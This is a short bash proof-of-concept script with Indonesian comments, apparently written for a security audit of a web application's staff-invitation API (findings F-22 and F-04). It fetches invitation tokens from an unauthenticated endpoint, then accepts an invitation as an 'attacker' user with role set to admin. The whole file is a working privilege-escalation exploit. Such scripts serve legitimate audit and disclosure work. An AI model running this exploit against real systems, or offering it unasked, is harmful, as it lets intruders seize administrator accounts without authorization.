#!/usr/bin/env bash
# PoC F-22 + F-04: baca token undangan tanpa auth, lalu terima undangan sebagai admin.
# Pemakaian: BASE=http://localhost:3000 ./05_priv_esc_invite.sh
set -euo pipefail
BASE="${BASE:-http://localhost:3000}"

echo "=== 1. daftar undangan tanpa autentikasi (F-22) ==="
curl -s "$BASE/api/staff/invitations" -o /tmp/kf_inv.json -w "status HTTP %{http_code}\n"
head -c 400 /tmp/kf_inv.json; echo

TOKEN_INVITE=$(python3 -c "
import json,sys
d=json.load(open('/tmp/kf_inv.json'))
rows=d.get('data') or []
print(rows[0]['token'] if rows else '')
" 2>/dev/null || true)

if [ -z "$TOKEN_INVITE" ]; then
  echo "[i] tidak ada undangan terbuka; lewati langkah 2"
  exit 0
fi

echo "=== 2. terima undangan dengan role=admin (F-04) ==="
echo "[i] token undangan: ${TOKEN_INVITE:0:12}..."
curl -s -X POST "$BASE/api/staff/accept-invitation" \
  -H 'Content-Type: application/json' \
  -d "{\"token\":\"$TOKEN_INVITE\",\"name\":\"attacker\",\"password\":\"P@ssw0rd!123\",\"role\":\"admin\"}"
echo
